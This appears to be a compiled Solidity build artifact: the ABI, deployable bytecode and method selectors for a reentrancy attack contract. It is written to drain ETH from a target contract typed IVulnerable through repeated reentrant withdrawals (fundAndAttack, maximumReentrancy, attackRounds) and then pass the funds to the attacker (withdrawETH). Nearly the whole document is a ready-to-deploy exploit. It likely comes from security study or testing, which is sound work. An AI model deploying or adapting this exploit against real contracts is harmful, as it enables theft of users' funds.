{"abi":[{"type":"constructor","inputs":[{"name":"_contractAddress","type":"address","internalType":"address payable"},{"name":"_maxReentrancy","type":"uint8","internalType":"uint8"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attackRounds","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"uint8"}],"stateMutability":"view"},{"type":"function","name":"attacker","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"contractBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"fundAndAttack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"maximumReentrancy","inputs":[],"outputs":[{"name":"","type":"uint8","internalType":"uint8"}],"stateMutability":"view"},{"type":"function","name":"s_isAttacking","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"stopAttack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"targetContract","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IVulnerable"}],"stateMutability":"view"},{"type":"function","name":"withdrawETH","inputs":[{"name":"_ethAmount","type":"uint256","internalType":"uint256"},{"name":"_receiverAddress","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackStarted","inputs":[{"name":"_attackerAddress","type":"address","indexed":true,"internalType":"address"},{"name":"_targetAddress","type":"address","indexed":true,"internalType":"address"},{"name":"_ethAmount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"AttackStopped","inputs":[{"name":"_attackerAddress","type":"address","indexed":true,"internalType":"address"},{"name":"_contractBalance","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"_targetBalance","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"EthDeposited","inputs":[{"name":"_contractAddress","type":"address","indexed":true,"internalType":"address"},{"name":"_ethAmount","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"EthWithdrawn","inputs":[{"name":"_attackerAddress","type":"address","indexed":true,"internalType":"address"},{"name":"_ethAmount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"_receiverAddress","type":"address","indexed":true,"internalType":"address"}],"anonymous":false},{"type":"error","name":"AmountTooLow","inputs":[]},{"type":"error","name":"InvalidAddress","inputs":[{"name":"_zeroAddress","type":"address","internalType":"address"}]},{"type":"error","name":"Unauthorized","inputs":[{"name":"_user","type":"address","internalType":"address"},{"name":"_attacker","type":"address","internalType":"address"}]},{"type":"error","name":"WithdrawalFailed","inputs":[]},{"type":"error","name":"ZeroMaxReentrancy","inputs":[{"name":"_zero","type":"uint64","internalType":"uint64"}]}],"bytecode":{"object":"0x60e060405234801561000f575f5ffd5b5060405161135738038061135783398181016040528101906100319190610230565b5f73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16148061009657503073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16145b156100d857816040517f8e4c8aa60000000000000000000000000000000000000000000000000000000081526004016100cf91906102c9565b60405180910390fd5b5f8160ff160361011f57806040517f1e88103e0000000000000000000000000000000000000000000000000000000081526004016101169190610325565b60405180910390fd5b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508060ff1660c08160ff16815250503373ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061033e565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101c9826101a0565b9050919050565b6101d9816101bf565b81146101e3575f5ffd5b50565b5f815190506101f4816101d0565b92915050565b5f60ff82169050919050565b61020f816101fa565b8114610219575f5ffd5b50565b5f8151905061022a81610206565b92915050565b5f5f604083850312156102465761024561019c565b5b5f610253858286016101e6565b92505060206102648582860161021c565b9150509250929050565b5f819050919050565b5f61029161028c610287846101a0565b61026e565b6101a0565b9050919050565b5f6102a282610277565b9050919050565b5f6102b382610298565b9050919050565b6102c3816102a9565b82525050565b5f6020820190506102dc5f8301846102ba565b92915050565b5f67ffffffffffffffff82169050919050565b5f61030f61030a610305846101fa565b61026e565b6102e2565b9050919050565b61031f816102f5565b82525050565b5f6020820190506103385f830184610316565b92915050565b60805160a05160c051610f6c6103eb5f395f818161019101526107b001525f818160ea015281816101e4015281816105150152818161056901528181610789015281816107f20152818161084601528181610945015281816109990152610c1801525f818160910152818161025a015281816102d50152818161035b015281816108f501528181610a6301528181610ae001528181610b5b01528181610be10152610c890152610f6c5ff3fe608060405260043610610089575f3560e01c806376be27f51161005857806376be27f5146104755780638b7afe2e1461049f578063a3844f06146104c9578063a5c00495146104df578063bd90df70146104e9576103cb565b806336118b52146103cf5780633cacb546146103f757806348eb76ee146104215780636bc8d0d31461044b576103cb565b366103cb575f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163190505f810361015e575f5f5f6101000a81548160ff0219169083151502179055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff167f8b1bd18af8cfbfc99d07ed5b0bce382e8d94b89b7364fa9158834fb5520011ef4783604051610150929190610cc5565b60405180910390a2506103c9565b5f600181819054906101000a900460ff168092919060010191906101000a81548160ff021916908360ff160217905550507f000000000000000000000000000000000000000000000000000000000000000060ff165f60019054906101000a900460ff1660ff1610610258575f5f5f6101000a81548160ff0219169083151502179055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff167f8b1bd18af8cfbfc99d07ed5b0bce382e8d94b89b7364fa9158834fb5520011ef478360405161024a929190610cc5565b60405180910390a2506103c9565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166380be6b7a6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102bd575f5ffd5b505af11580156102cf573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f14210a6346040518263ffffffff1660e01b815260040161032c9190610cec565b5f604051808303815f87803b158015610343575f5ffd5b505af1158015610355573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff167f66ff7c8f71ccc7c36152a41920d0d3b46ef3034359f76aa1498ed4478c204b5c346040516103bf9190610cec565b60405180910390a2505b005b5f5ffd5b3480156103da575f5ffd5b506103f560048036038101906103f09190610d8d565b610513565b005b348015610402575f5ffd5b5061040b610775565b6040516104189190610de5565b60405180910390f35b34801561042c575f5ffd5b50610435610786565b6040516104429190610e0d565b60405180910390f35b348015610456575f5ffd5b5061045f6107ad565b60405161046c9190610e41565b60405180910390f35b348015610480575f5ffd5b506104896107d4565b6040516104969190610e41565b60405180910390f35b3480156104aa575f5ffd5b506104b36107e9565b6040516104c09190610cec565b60405180910390f35b3480156104d4575f5ffd5b506104dd6107f0565b005b6104e7610943565b005b3480156104f4575f5ffd5b506104fd610c86565b60405161050a9190610eb5565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105c557337f00000000000000000000000000000000000000000000000000000000000000006040517f295a81c10000000000000000000000000000000000000000000000000000000081526004016105bc929190610ece565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16148061062a57503073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b1561066c57806040517f8e4c8aa60000000000000000000000000000000000000000000000000000000081526004016106639190610e0d565b60405180910390fd5b5f8173ffffffffffffffffffffffffffffffffffffffff168360405161069190610f22565b5f6040518083038185875af1925050503d805f81146106cb576040519150601f19603f3d011682016040523d82523d5f602084013e6106d0565b606091505b505090508061070b576040517f27fcd9d100000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b8173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167f998ed846daff0e574d9c1cf2ea840040c6696b5e39c96c4dc7aa097cc647b821856040516107689190610cec565b60405180910390a3505050565b5f5f9054906101000a900460ff1681565b5f7f0000000000000000000000000000000000000000000000000000000000000000905090565b5f7f0000000000000000000000000000000000000000000000000000000000000000905090565b5f5f60019054906101000a900460ff16905090565b5f47905090565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146108a257337f00000000000000000000000000000000000000000000000000000000000000006040517f295a81c1000000000000000000000000000000000000000000000000000000008152600401610899929190610ece565b60405180910390fd5b5f5f5f6101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff167f8b1bd18af8cfbfc99d07ed5b0bce382e8d94b89b7364fa9158834fb5520011ef477f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1631604051610939929190610cc5565b60405180910390a2565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146109f557337f00000000000000000000000000000000000000000000000000000000000000006040517f295a81c10000000000000000000000000000000000000000000000000000000081526004016109ec929190610ece565b60405180910390fd5b5f3403610a2e576040517f1fbaba3500000000000000000000000000000000000000000000000000000000815260040160405180910390fd5b5f5f60016101000a81548160ff021916908360ff16021790555060015f5f6101000a81548160ff0219169083151502179055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f6326fb3346040518263ffffffff1660e01b81526004015f604051808303818588803b158015610ac7575f5ffd5b505af1158015610ad9573d5f5f3e3d5ffd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166380be6b7a6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610b43575f5ffd5b505af1158015610b55573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f14210a6346040518263ffffffff1660e01b8152600401610bb29190610cec565b5f604051808303815f87803b158015610bc9575f5ffd5b505af1158015610bdb573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff167f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff167f96a902baacc5b20269b1bbc462a6a02ee11da95ab9799f59958fe0d5883d514734604051610c7c9190610cec565b60405180910390a3565b5f7f0000000000000000000000000000000000000000000000000000000000000000905090565b5f819050919050565b610cbf81610cad565b82525050565b5f604082019050610cd85f830185610cb6565b610ce56020830184610cb6565b9392505050565b5f602082019050610cff5f830184610cb6565b92915050565b5f5ffd5b610d1281610cad565b8114610d1c575f5ffd5b50565b5f81359050610d2d81610d09565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610d5c82610d33565b9050919050565b610d6c81610d52565b8114610d76575f5ffd5b50565b5f81359050610d8781610d63565b92915050565b5f5f60408385031215610da357610da2610d05565b5b5f610db085828601610d1f565b9250506020610dc185828601610d79565b9150509250929050565b5f8115159050919050565b610ddf81610dcb565b82525050565b5f602082019050610df85f830184610dd6565b92915050565b610e0781610d52565b82525050565b5f602082019050610e205f830184610dfe565b92915050565b5f60ff82169050919050565b610e3b81610e26565b82525050565b5f602082019050610e545f830184610e32565b92915050565b5f819050919050565b5f610e7d610e78610e7384610d33565b610e5a565b610d33565b9050919050565b5f610e8e82610e63565b9050919050565b5f610e9f82610e84565b9050919050565b610eaf81610e95565b82525050565b5f602082019050610ec85f830184610ea6565b92915050565b5f604082019050610ee15f830185610dfe565b610eee6020830184610dfe565b9392505050565b5f81905092915050565b50565b5f610f0d5f83610ef5565b9150610f1882610eff565b5f82019050919050565b5f610f2c82610f02565b915081905091905056fea2646970667358221220dc319c3eb74a26894666bc9842f9bbfa57b3428a67063adee894006db517ca0464736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attackRounds()":"76be27f5","attacker()":"48eb76ee","contractBalance()":"8b7afe2e","fundAndAttack()":"a5c00495","maximumReentrancy()":"6bc8d0d3","s_isAttacking()":"3cacb546","stopAttack()":"a3844f06","targetContract()":"bd90df70","withdrawETH(uint256,address)":"36118b52"},"id":9}